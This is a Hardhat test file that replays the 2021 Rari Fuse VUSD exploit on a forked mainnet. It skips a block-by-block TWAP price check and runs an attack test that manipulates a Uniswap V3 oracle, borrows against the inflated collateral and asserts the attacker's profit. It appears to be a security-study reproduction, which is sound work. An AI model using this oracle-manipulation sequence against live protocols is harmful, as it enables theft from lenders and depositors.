import { expect } from "chai";
import { BigNumber, Contract, ContractTransaction, Signer } from "ethers";
import hre, { ethers, network } from "hardhat";
import _ from "lodash";
import { forkFrom } from "./utils/fork";
import { getAttackerContractName } from "./utils/fs";

/*
# Post Mortems
https://twitter.com/jai_bhavnani/status/1455598838433992704
https://twitter.com/Mudit__Gupta/status/1455627465678749696

# TX:
Manipulation: https://etherscan.io/tx/0x89d0ae4dc1743598a540c4e33917efdce24338723b0fabf34813b79cb0ecf4c5
Deposit & Borrow: https://etherscan.io/tx/0x8527fea51233974a431c92c4d3c58dee118b05a3140a04e0f95147df9faf8092
V3 Position: https://opensea.io/assets/0xc36442b4a4522e871399cd717abdd847ab11fe88/148496

Attacker contract: 0x7993e1d66ffb1ab3fb1cb3db87219f532c25bdc8
# Code:
fuse-VUSD: (fVUSD-23) https://etherscan.io/address/0x2914e8c1c2c54e5335dc9554551438c59373e807#code (deposit)
fuse-WBTC: (fVUSD-23) https://etherscan.io/address/0x0302f55dc69f5c4327c8a6c3805c9e16fc1c3464 (borrow)
Minter.sol (USDC to VUSD): https://etherscan.io/address/0xb652fc42e12828f3f1b3e96283b199e62ec570db#code
*/
let accounts: Signer[];
let attackerEOA: Signer;
let attacker: Contract;
let tx: ContractTransaction;
let firstTxBlock = 13537922;
let secondTxBlock = 13537933;

before(async () => {
  await forkFrom(firstTxBlock - 1);

  accounts = await ethers.getSigners();
  [attackerEOA] = accounts;

  const attackerFactory = await ethers.getContractFactory(
    getAttackerContractName(__filename),
    attackerEOA
  );
  attacker = await attackerFactory.deploy();
});

describe.skip("Rari Fuse VUSD Hack TWAP price replay", function () {
  it("checks Uniswap TWAP", async function () {
    const attackerFactory = await ethers.getContractFactory(
      getAttackerContractName(__filename),
      attackerEOA
    );
    attacker = await attackerFactory.deploy();
    let attackerAddress = attacker.address;
    // cache code once
    let attackerCode = await network.provider.send("eth_getCode", [
      attackerAddress,
      `pending`,
    ]);

    for (let block = firstTxBlock; block < secondTxBlock; block++) {
      console.log(`--- Block ${block}`);
      // set state to AFTER of block (block mined and all transactions have been executed)
      await forkFrom(block);

      // set code like this to avoid mining a block which must by definition have a strictly greater timestamp, which would change the TWAP
      // only call view functions as well
      await network.provider.send("hardhat_setCode", [
        attackerAddress,
        attackerCode,
      ]);
      attacker = await attackerFactory.attach(attackerAddress);
      // let's read the Uniswap TWAP. Fuse used a secondsAgo of 600 (10 minutes)
      await attacker.printUniswapTwapPrice(600);
    }
    /** USDC per VUSD prices at end of block:
      --- Block 13537922 (attacker swap happened here)
        Price: 0.988964
      --- Block 13537923
        Price: 1293.031076
      --- Block 13537924
        Price: 16091.047672
      --- Block 13537925
        Price: 28793.048286
      --- Block 13537926
        Price: 34953.698466
      --- Block 13537927
        Price: 243088.923366
      --- Block 13537928
        Price: 7977279.941027
      --- Block 13537929
        Price: 215644807.583917
      --- Block 13537930
        Price: 690402294.848451
      --- Block 13537931
        Price: 1017552049.183367
      --- Block 13537932
        Price: 1960630954978.808896
    */
  });
});

describe("Rari Fuse VUSD Hack", function () {
  it("performs the attack", async function () {
    let initialEthBalance = await attackerEOA.getBalance();

    tx = await attacker.connect(attackerEOA).manipulateUniswapV3({
      value: ethers.utils.parseEther(`1000`),
    });
    // make sure it's mined, don't want to batch it with next tx
    await tx.wait();

    // now wait 1 block, ~13 seconds, for TWAP manipulation to kick in, 18.0 USDC/VUSD price
    // it's much more efficient to wait ~30 seconds for a 490.0 USDC/VUSD price
    await network.provider.send("evm_increaseTime", [30]);
    tx = await attacker.connect(attackerEOA).fuseAttack();

    let finalEthBalance = await attackerEOA.getBalance();
    let profit = finalEthBalance.sub(initialEthBalance);
    console.log(`Profit: ${ethers.utils.formatEther(profit)} ETH`);

    expect(profit, "attacker wrong balance").gt(`0`);
  });
});
